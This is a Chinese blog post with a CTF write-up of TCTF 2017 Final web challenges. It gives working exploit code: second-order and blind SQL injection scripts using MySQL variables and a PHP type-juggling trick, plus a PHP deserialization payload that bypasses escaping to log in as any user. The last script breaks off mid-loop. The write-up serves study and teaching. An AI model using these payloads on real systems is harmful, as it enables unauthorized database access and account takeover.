@@ -1,0 +1,568 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+        <meta charset="utf-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <title>TCTF 2017 Final 部分 Web 题 Writeup</title>
+        <link rel="stylesheet" href="https://phuker.github.io/theme/css/main.css" />
+        <link href="https://phuker.github.io/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="Phuker Atom Feed" />
+
+        <script type="text/javascript" src="https://phuker.github.io/theme/js/jquery-3.2.0.min.js"></script>
+        <script type="text/javascript" src="https://phuker.github.io/theme/js/cav.js"></script>
+        <script type="text/javascript" src="https://phuker.github.io/theme/js/qqmain.js"></script>
+
+        <!--[if IE]>
+            <script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+        <![endif]-->
+</head>
+
+<body id="index" class="home">
+        <header id="banner" class="body">
+                <h1><a href="https://phuker.github.io/#">Phuker  <strong>Phuker @ Blue-Whale Team</strong> </a></h1>
+                <nav><ul>
+                    <li><a href="/#">Home</a></li>
+                    <li><a href="https://phuker.github.io/category/about.html">About</a></li>
+                    <li><a href="https://phuker.github.io/category/misc.html">Misc</a></li>
+                    <li class="active"><a href="https://phuker.github.io/category/web.html">Web</a></li>
+                </ul>
+                </nav>
+        </header><!-- /#banner -->
+<section id="content" class="body">
+  <article>
+    <header>
+      <h1 class="entry-title">
+        <a href="https://phuker.github.io/tctf2017-final-web.html" rel="bookmark"
+           title="Permalink to TCTF 2017 Final 部分 Web 题 Writeup">TCTF 2017 Final 部分 Web 题 Writeup</a></h1>
+    </header>
+
+    <div class="entry-content">
+<footer class="post-info">
+        <span>2017-06-12 周一</span>
+        	<span>| by <a class="url fn" href="https://phuker.github.io/author/admin.html">admin</a></span>
+<span>| tags: <a href="https://phuker.github.io/tag/ctf.html">CTF</a><a href="https://phuker.github.io/tag/web.html">web</a></span>
+</footer><!-- /.post-info -->      <p>近期洒家参加了TCTF 决赛 RisingStar CTF，其中有几道Web题还是很有意思的，在此做一下详细的记录。    </p>
+<h1>关于比赛</h1>
+<p>说起来这还是洒家第一次坐飞机，飞机上景色不错，起飞和降落的时候加速度给人很爽的感觉。然而飞到深圳，一出地铁洒家就慌了，真不是埋汰他，这城市是真滴很热。不过这里也有好的地方，每个建筑物里面肯定有空调。所以洒家这几天除了比赛和参观都不出门，什么景点都没看。<br>
+赛场上见识了很多国内和国际的大佬，后者有 Shellphish、LC⚡BC 等，以及有女装大佬的Binja。</p>
+<p><img alt="都是大佬" src="images/tctf2017-final.jpg" style="max-width:100%;margin:0;"><br>
+（图：都是大佬）<br>
+比赛中洒家主要负责Web方面，题目很有难度，主要思路是跟着国际赛的计分板走。第一天在做Avatar Center，首先发现了一个SQL注入，把数据库扒了个底朝天也没发现flag，又研究设置头像功能和设置时区功能一直没有搞清程序的逻辑。然而让人意外的是，一次登录之后突然发现flag出现在了本应该显示时区的位置。洒家走了狗屎运，捡漏了！后来才知道可以扫出来一个FTP端口拿源码，设置时区那里有命令注入漏洞（黑人问号？？？）。拿到这个flag后，第一天的比赛快结束了，考虑到 Ugly Web 有一堆源码需要审计，也有很多人解出来了这道题，回到酒店主要在审计源码。洒家很快发现了第一个漏洞（反序列化+SQL注入），本地环境可以拿到2个flag，但是很怕这里面有坑，因为大家都只做出来了第1个flag。果然，第二天开场运行脚本只能拿到一个flag。第二天上午因为搞不出来Ugly Web flag 2，洒家转向了 Ocean Fish，很快发现了SQL注入漏洞，拿到了admin密码作为第1个flag。进入后台之后，找到了执行任意PHP代码的方法，也分析出来 flag 肯定就在 OPCache 里面。但是有 <code>disable_functions</code> 和 <code>open_basedir</code> 的限制并不能拿到 OPCache。赛后才知道要用到 SQLite 的 bug/feature 来绕过。<br>
+比赛过程中断断续续分析了Lucky game，但是WAF太厉害，并不能解出这道题。在这里必须要膜一下AAA战队的大佬。 <br>
+最后做出了 Web 的3道题，总体拿到了 Rising Star CTF 第7的成绩。<br>
+以下是部分题目的记录。  </p>
+<h1>Lucky Game</h1>
+<p>这道题的主要功能是猜数字，首先注册、登录，然后可以用10个points的本金赌猜数字。题目的 flag 是 md5(password_of_admin)。题目给出了 index.php 的源码，代码非常简洁只有二百余行，显然是SQL注入来拿admin的密码 md5，但是却暗藏玄机。   </p>
+<h2>初步分析代码</h2>
+<ul>
+<li>有一个 filter 函数，除了常见的几个SQL黑名单之外还过滤了数据库的所有表名、列名   <br>
+register、login、user_log、my_point函数都经过filter函数过滤。综合来看，所有进入SQL的用户输入都经过了 filter 过滤。  </li>
+<li>所有的$_GET $_POST 的值都经过了 mysqli_escape_string 转义<br>
+登录、注册受到影响。</li>
+<li>猜数字的参数使用了 $_REQUEST['bet'] 和 $_REQUEST['guess']，不会被转义  </li>
+<li>简单的测试可以发现，数据库在 INSERT 的时候，会拒绝对于该字段过长的输入，猜测是开启了 <code>STRICT_TRANS_TABLES</code> 这种 <code>sql_mode</code>。</li>
+</ul>
+<p>两个 SQL注入漏洞：  </p>
+<ul>
+<li>登录、注册经过了转义，但是登录成功之后 $_SESSION['user'] 存储的是原始没有经过转义的用户名，可以在后面的 my_point 函数造成二次注入。<br>
+但是 update_point 函数使用了数字型的 $_SESSION['id']，不会有注入风险。</li>
+<li>user_log 函数可以 INSERT 注入<br>
+每轮游戏之后如果猜对了数字，会执行 update_point($_REQUEST['bet'])，这个函数的 SQL 语句使用 %d 格式化字符串，无法注入；随后调用 user_log 函数，参数不会被转义，只经过了 filter 函数过滤，可以SQL注入。但是如果没有猜对数字，则会执行 update_point(-$_REQUEST['bet'])，这时候这个参数被类型转换成了数字型，无法注入。根据代码成功概率是1/8。  <br>
+user_log 函数中可以利用数据库的严格模式，报错实现盲注（Error-based blind SQL injection）。可以用以下报错方法：插入超长数据报错、数据类型不匹配报错、除零报错等。</li>
+</ul>
+<h2>难点</h2>
+<p>我在发现这两个漏洞之后，注册了一个 <code>'union select 1,1,1,'98</code> 账号，避免余额不足的问题；然后写脚本用后面的盲注查询了一堆<code>version()</code>、<code>user()</code>。但是如果要查询admin的密码，绕不开 filter() 的限制。以前如果只限制了列名，还可以用<a href="/ddctf2017-web.html">别名等trick</a>绕过，然而这里限制了表名，只能当场GG。  </p>
+<h2>绕过 filter()的整体思路</h2>
+<p>赛后看了<a href="http://www.melodia.pw/?p=902">小m的博客</a>以及听了主办方讲解，知道了可行的方法：<br>
+整个代码的执行过程是同一次MySQL连接，可以用在二次注入中用<a href="https://dev.mysql.com/doc/refman/5.7/en/select-into.html">SELECT ... INTO Syntax</a>把SELECT的结果弄到一个变量里面，然后再用另一个SQL盲注漏洞把变量查询出来。用MySQL变量把两个漏洞结合起来，巧妙地绕过了 filter()。  <br>
+那么整体的思路是：<br>
+注册用户 <code>admin' into @a,@b,@c,@d#</code>，用户名二次注入在my_point() 中形成SQL语句：</p>
+<div class="highlight"><pre><span></span><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">users</span> <span class="k">WHERE</span> <span class="n">username</span> <span class="o">=</span> <span class="s1">&#39;admin&#39;</span> <span class="k">into</span> <span class="o">@</span><span class="n">a</span><span class="p">,</span><span class="o">@</span><span class="n">b</span><span class="p">,</span><span class="o">@</span><span class="k">c</span><span class="p">,</span><span class="o">@</span><span class="n">d</span><span class="o">#</span><span class="err">&#39;</span>
+</pre></div>
+
+
+<p>然后使用INSERT 盲注，只需要查询 @c 变量，就绕过了 filter() 的限制。<br>
+以上是大概的思路。然后还要解决用户名的副作用： 由于 SELECT 的结果进入了变量，不会把结果集返回给PHP，my_point() 函数返回值是 int 0，需要在后面处理余额为0的问题。需要满足条件：</p>
+<div class="highlight"><pre><span></span><span class="x">(int)$_REQUEST[&#39;bet&#39;] &gt; 0 &amp;&amp; !($_REQUEST[&#39;bet&#39;] &gt; $points) // $points === 0</span>
+</pre></div>
+
+
+<p>看似矛盾，但是作为最好的语言，PHP必有特性。经过<a href="https://3v4l.org/">一番试验</a>，在特定PHP版本下，由于使用<code>(int)</code>强制类型转换和比较运算时类型转换规则和结果的不同，科学记数法<code>1e-10000</code>在强制类型转换的时候值为1，然而在和0比较时，则会等于0</p>
+<div class="highlight"><pre><span></span><span class="x">var_dump((int)&#39;1e-10000&#39;); // 1</span>
+<span class="x">var_dump(&#39;1e-10000&#39; == 0); // true</span>
+</pre></div>
+
+
+<p>根据这个特性， $_REQUESTS['bet'] 以 <code>1e-10000</code> 开头就可以成功注入。  </p>
+<h2>攻击脚本</h2>
+<p>实际运行可以发现，由于只有猜数字赢了才能注入，成功率较低。洒家优化了脚本，尽可能减少请求次数。由于需要得到的是 md5 只由 0-9 a-f 组成，所以只获取3-4个ASCII的二进制位就可以确定这个字符。脚本用了数据类型不匹配报错。  </p>
+<div class="highlight"><pre><span></span><span class="c1"># encoding: utf-8</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">string</span>
+<span class="kn">import</span> <span class="nn">random</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">logging</span>
+
+<span class="n">logging</span><span class="o">.</span><span class="n">basicConfig</span><span class="p">(</span><span class="n">level</span><span class="o">=</span><span class="n">logging</span><span class="o">.</span><span class="n">INFO</span><span class="p">,</span>
+                    <span class="n">format</span><span class="o">=</span><span class="s1">&#39;</span><span class="si">%(asctime)s</span><span class="s1"> [</span><span class="si">%(levelname)s</span><span class="s1">]:</span><span class="si">%(message)s</span><span class="s1">&#39;</span><span class="p">,</span>
+                    <span class="n">datefmt</span><span class="o">=</span><span class="s1">&#39;%H:%M:%S&#39;</span><span class="p">,</span>
+                    <span class="n">stream</span><span class="o">=</span><span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="p">)</span>
+
+<span class="c1"># generate 4 chars as mysql variable</span>
+<span class="n">db_variables</span> <span class="o">=</span> <span class="p">[]</span>
+<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+    <span class="n">ch</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">ch</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">db_variables</span><span class="p">:</span>
+        <span class="n">db_variables</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">ch</span><span class="p">)</span>
+        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">db_variables</span><span class="p">)</span> <span class="o">==</span> <span class="mi">4</span><span class="p">:</span>
+            <span class="k">break</span>
+
+<span class="n">username</span> <span class="o">=</span> <span class="s2">&quot;admin&#39; into </span><span class="si">%s</span><span class="s2">#&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="s1">&#39;@&#39;</span> <span class="o">+</span> <span class="n">ch</span> <span class="k">for</span> <span class="n">ch</span> <span class="ow">in</span> <span class="n">db_variables</span><span class="p">]),</span> <span class="p">)</span>
+<span class="n">password</span> <span class="o">=</span> <span class="s1">&#39;1234321&#39;</span>
+<span class="c1"># proxies = {&#39;http&#39;: &#39;127.0.0.1:8080&#39;} # Burp Suite, for debug</span>
+<span class="n">proxies</span> <span class="o">=</span> <span class="bp">None</span>
+<span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://192.168.201.3/&#39;</span> <span class="c1"># 比赛场地内网</span>
+
+<span class="n">sess</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
+<span class="n">sess</span><span class="o">.</span><span class="n">proxies</span> <span class="o">=</span> <span class="n">proxies</span>
+
+<span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;url: </span><span class="si">%s</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">url</span><span class="p">)</span>
+<span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;username: </span><span class="si">%s</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">username</span><span class="p">)</span>
+
+<span class="c1"># register</span>
+<span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;register&#39;</span><span class="p">)</span>
+<span class="n">sess</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;action&#39;</span><span class="p">:</span> <span class="s1">&#39;register&#39;</span><span class="p">},</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;user&#39;</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span> <span class="s1">&#39;pass&#39;</span><span class="p">:</span> <span class="n">password</span><span class="p">})</span>
+
+<span class="c1"># login</span>
+<span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;login&#39;</span><span class="p">)</span>
+<span class="n">r</span> <span class="o">=</span> <span class="n">sess</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;action&#39;</span><span class="p">:</span> <span class="s1">&#39;login&#39;</span><span class="p">},</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;user&#39;</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span> <span class="s1">&#39;pass&#39;</span><span class="p">:</span> <span class="n">password</span><span class="p">})</span>
+<span class="k">if</span> <span class="s1">&#39;&lt;h2&gt;You got &#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">content</span><span class="p">:</span>
+    <span class="n">logging</span><span class="o">.</span><span class="n">error</span><span class="p">(</span><span class="s1">&#39;register or login failed&#39;</span><span class="p">)</span>
+    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;login success&#39;</span><span class="p">)</span>
+
+
+<span class="n">request_count</span> <span class="o">=</span> <span class="mi">0</span>
+
+
+<span class="k">def</span> <span class="nf">bin_place</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">times</span><span class="p">):</span>
+    <span class="sd">&#39;&#39;&#39;</span>
+<span class="sd">    get ascii binary place at offset (offset starts from 1 in sql)</span>
+<span class="sd">    e.g. &#39;abcde&#39; is admin&#39;s password</span>
+<span class="sd">    bin_place(2, 3)  ord(substr(&#39;abcde&#39;,2,1)) =  0b110 0 010 return 0</span>
+<span class="sd">    bin_place(1, 5)  ord(substr(&#39;abcde&#39;,3,1)) =  0b1 1 00001 return 2 ** 5</span>
+<span class="sd">    &#39;&#39;&#39;</span>
+    <span class="k">global</span> <span class="n">request_count</span>
+
+    <span class="n">num</span> <span class="o">=</span> <span class="mi">2</span> <span class="o">**</span> <span class="n">times</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;1e-10000&#39;),(if(ord(substr((select @</span><span class="si">%s</span><span class="s2">),</span><span class="si">%d</span><span class="s2">,1))&amp;</span><span class="si">%d</span><span class="s2">,&#39;a&#39;,5),&#39;s&#39;)#&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">db_variables</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="n">offset</span><span class="p">,</span> <span class="n">num</span><span class="p">)</span>
+    <span class="n">params</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;bet&#39;</span><span class="p">:</span> <span class="n">payload</span><span class="p">,</span> <span class="s1">&#39;guess&#39;</span><span class="p">:</span> <span class="s1">&#39;5&#39;</span><span class="p">}</span>
+
+    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>  <span class="c1"># until win</span>
+        <span class="n">request_count</span> <span class="o">+=</span> <span class="mi">1</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">sess</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="n">params</span><span class="p">)</span>
+        <span class="k">if</span> <span class="s1">&#39;won&#39;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">content</span><span class="p">:</span>    <span class="c1"># update_point($_REQUEST[&#39;bet&#39;]), can sql inject</span>
+            <span class="k">if</span> <span class="s1">&#39;&lt;/html&gt;&#39;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">content</span><span class="p">:</span>
+                <span class="k">return</span> <span class="mi">0</span>    <span class="c1"># not error</span>
+            <span class="k">else</span><span class="p">:</span>
+                <span class="k">return</span> <span class="n">num</span>  <span class="c1"># error</span>
+
+<span class="n">result</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+<span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;retrieving admin password md5&#39;</span><span class="p">)</span>
+<span class="k">for</span> <span class="n">offset</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">32</span> <span class="o">+</span> <span class="mi">1</span><span class="p">):</span>
+    <span class="c1"># for md5 0-9a-f, only need to get part of binary places</span>
+    <span class="k">if</span> <span class="n">bin_place</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="mi">6</span><span class="p">):</span>   <span class="c1"># a - f</span>
+        <span class="n">result</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span> <span class="o">+</span> <span class="n">bin_place</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">bin_place</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">bin_place</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="mi">2</span><span class="p">))</span>
+    <span class="k">else</span><span class="p">:</span>   <span class="c1"># 0 - 9</span>
+        <span class="n">result</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="si">%d</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">bin_place</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">bin_place</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">bin_place</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span> <span class="o">+</span> <span class="n">bin_place</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="mi">3</span><span class="p">),</span> <span class="p">)</span>
+    <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;retrieved: </span><span class="si">%s</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">result</span><span class="p">)</span>
+
+
+<span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;end with </span><span class="si">%d</span><span class="s1"> requests&#39;</span><span class="p">,</span> <span class="n">request_count</span><span class="p">)</span>
+<span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;flag is: flag{</span><span class="si">%s</span><span class="s1">}&#39;</span><span class="p">,</span> <span class="n">result</span><span class="p">)</span>
+</pre></div>
+
+
+<h1>Ugly Web</h1>
+<p>题目是一个站内信系统，给出了一大堆源码。功能有注册、登录、重置、发送消息、显示消息。粗略看了一下还有3个类：User、Message、MessageManager。这套代码里面有2个flag，分别对应分开的两个题目。第一个在数据库中，显然需要SQL注入获得，第二个在 config.php，用admin账号登录时发送。同时这道题目有两台服务器，之间的代码有区别，分别存储两个flag。  <br>
+洒家在酒店花了几个小时的时间看了大部分代码。首先轻松发现了第一个漏洞。这个漏洞理论上可以在两道题目上使用，但是第二天实际运行可以发现第二个服务器的代码做了修改，已经无法利用。然后洒家看了剩下的大部分代码也没有发现漏洞。这里洒家犯了严重的错误，在用第一个漏洞干掉两道题之后，漏掉了 reset.php 没有看。毕竟还是too  young too simple，还是缺乏章法和经验，一场严谨正常的比赛，不可能用一个漏洞拿两个flag。     </p>
+<h2>吐槽</h2>
+<p>PHP作为弱类型、动态类型的编程语言，直接看到一个函数根本无法确定它的参数都是什么数据类型。对于关键的函数必须分析函数调用关系，确定参数、变量可能的数据类型。个人认为，PHP因为有这样的特点，有各种特性古怪的函数，以及有其他的特点，导致了它的程序容易出现不容易发现的漏洞，增加写出正确程序、审计代码的成本。</p>
+<h2>漏洞 1  PHP反序列化 + SQL注入</h2>
+<h3>escape()</h3>
+<p>网站的功能的实现都已经抽象对这3个类的操作，因此分析这3个类的代码很重要。User 类中有一个 escape() 函数引人注意：  </p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="k">function</span> <span class="nf">escape</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$str</span><span class="p">))</span> <span class="c1">// escape 值，不escape键</span>
+    <span class="p">{</span>
+        <span class="nv">$str</span> <span class="o">=</span> <span class="nb">array_map</span><span class="p">([</span><span class="o">&amp;</span><span class="nv">$this</span><span class="p">,</span> <span class="s1">&#39;escape&#39;</span><span class="p">],</span> <span class="nv">$str</span><span class="p">);</span>
+        <span class="k">return</span> <span class="nv">$str</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nb">is_string</span><span class="p">(</span><span class="nv">$str</span><span class="p">))</span>
+    <span class="p">{</span>
+        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">dbConn</span><span class="o">-&gt;</span><span class="na">real_escape_string</span><span class="p">(</span><span class="nv">$str</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nb">is_bool</span><span class="p">(</span><span class="nv">$str</span><span class="p">))</span>  <span class="c1">// int 0 1</span>
+    <span class="p">{</span>
+        <span class="k">return</span> <span class="p">(</span><span class="nv">$str</span> <span class="o">===</span> <span class="k">false</span><span class="p">)</span> <span class="o">?</span> <span class="mi">0</span> <span class="o">:</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$str</span> <span class="o">===</span> <span class="k">null</span><span class="p">)</span> <span class="c1">// string &#39;NULL&#39;</span>
+    <span class="p">{</span>
+        <span class="k">return</span> <span class="s1">&#39;NULL&#39;</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="nv">$str</span><span class="p">;</span>  <span class="c1">// 其他类型直接返回原值，不过滤</span>
+<span class="p">}</span>
+</pre></div>
+
+
+<p>这个函数对于 array、string、bool、null 都有操作，但是对于其他数据类型直接返回原始值。其他数据类型有什么可能？常见的就是 int float，还有一个重要的 object。  </p>
+<h3>登录</h3>
+<p><code>User-&gt;login($email, $password, $remember = false, $loadUser = true)</code>会对 $email escape() 处理，$password 变为 md5，直接传入 $email 和 $password 字符串不存在SQL注入漏洞。<br>
+网站登录的地方有一个<code>Remember me</code>的功能，如果选中则会在<code>User-&gt;login()</code>中登录成功后返回一个Cookie，内容是<code>array('email'=&gt;$email,'password'=&gt;$originalPassword)</code>的序列化字符串。当session为空，但是发送了这个Cookie，会反序列化这个字符串，将这个数组的成员作为参数传入 User-&gt;login() 自动登录。</p>
+<h3>反序列化漏洞 + SQL注入</h3>
+<p>这里自然可以考虑PHP反序列化漏洞。除了User类之外还有两个类可以考虑使用，经过观察 Message 类有一个 __toString 魔术方法：</p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="k">class</span> <span class="nc">Message</span><span class="p">{</span>
+    <span class="k">var</span> <span class="nv">$msg</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
+    <span class="k">var</span> <span class="nv">$from</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
+    <span class="k">var</span> <span class="nv">$to</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
+    <span class="k">var</span> <span class="nv">$id</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+
+    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$from</span><span class="p">,</span> <span class="nv">$to</span><span class="p">,</span> <span class="nv">$msg</span><span class="p">,</span> <span class="nv">$id</span><span class="o">=-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+        <span class="c1">// ....</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="fm">__toString</span><span class="p">(){</span>
+        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">msg</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</pre></div>
+
+
+<p>结合上面对 User-&gt;escape() 的分析，可以把 Message 对象作为 $email 传入 User-&gt;login()，对象可以直接绕过escape，然后在拼接SQL时，会调用 Message-&gt;__toString() 返回 Message-&gt;msg，将 Message-&gt;msg 直接拼接进入SQL语句，造成SQL注入漏洞。下面是登录任意账号的方法：  </p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="nv">$payload</span> <span class="o">=</span> <span class="s1">&#39;root@5alt.me\&#39;#&#39;</span><span class="p">;</span>
+<span class="nv">$msg</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Message</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">,</span><span class="s1">&#39;b&#39;</span><span class="p">,</span><span class="nv">$payload</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+<span class="nv">$rem</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;email&#39;</span><span class="o">=&gt;</span><span class="nv">$msg</span><span class="p">,</span><span class="s1">&#39;password&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;p&#39;</span><span class="p">];</span>
+<span class="k">echo</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="nv">$rem</span><span class="p">));</span>
+</pre></div>
+
+
+<p>分析其他代码，这一个用户输入并不容易进入更深的程序中，并不容易直接显示flag。因此我使用了<code>Boolean-based blind</code>盲注获得数据库中的flag。  </p>
+<h3>脚本 select flag from flag</h3>
+<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">phpserialize</span>
+<span class="kn">import</span> <span class="nn">time</span>
+
+<span class="n">flag</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+<span class="n">payload_template</span> <span class="o">=</span> <span class="s2">&quot;no.nc&#39;or `email`=if(ascii(substr((select flag from flag),</span><span class="si">%d</span><span class="s2">,1))&amp;</span><span class="si">%d</span><span class="s2">, &#39;root@5alt.me&#39;,&#39;no.nc&#39;) -- &quot;</span>
+<span class="n">ckSavePass_template</span> <span class="o">=</span> <span class="s1">&#39;a:2:{s:5:&quot;email&quot;;O:7:&quot;Message&quot;:4:{s:3:&quot;msg&quot;;</span><span class="si">%s</span><span class="s1">s:4:&quot;from&quot;;s:4:&quot;from&quot;;s:2:&quot;to&quot;;s:2:&quot;to&quot;;s:2:&quot;id&quot;;i:-1;}s:8:&quot;password&quot;;s:14:&quot;wrong password&quot;;}&#39;</span>
+
+<span class="n">default_domain</span> <span class="o">=</span> <span class="s1">&#39;http://WWW.EXAMPLE.COM/&#39;</span> <span class="c1"># server ip  </span>
+<span class="n">url</span> <span class="o">=</span> <span class="n">domain</span> <span class="o">+</span> <span class="s1">&#39;login.php&#39;</span>
+<span class="n">offset</span> <span class="o">=</span> <span class="mi">1</span>
+<span class="n">proxies</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;http&#39;</span><span class="p">:</span><span class="s1">&#39;http://127.0.0.1:8080/&#39;</span><span class="p">}</span> <span class="c1"># burp suite for debug</span>
+
+<span class="k">while</span> <span class="s1">&#39;}&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">flag</span><span class="p">:</span>
+    <span class="n">place_ascii</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="k">for</span> <span class="n">power</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">7</span><span class="p">):</span>
+        <span class="n">power_num</span> <span class="o">=</span> <span class="mi">2</span> <span class="o">**</span> <span class="n">power</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="n">payload_template</span> <span class="o">%</span> <span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">power_num</span><span class="p">)</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="n">phpserialize</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+        <span class="n">cksavePass</span> <span class="o">=</span> <span class="n">ckSavePass_template</span> <span class="o">%</span> <span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="p">)</span>
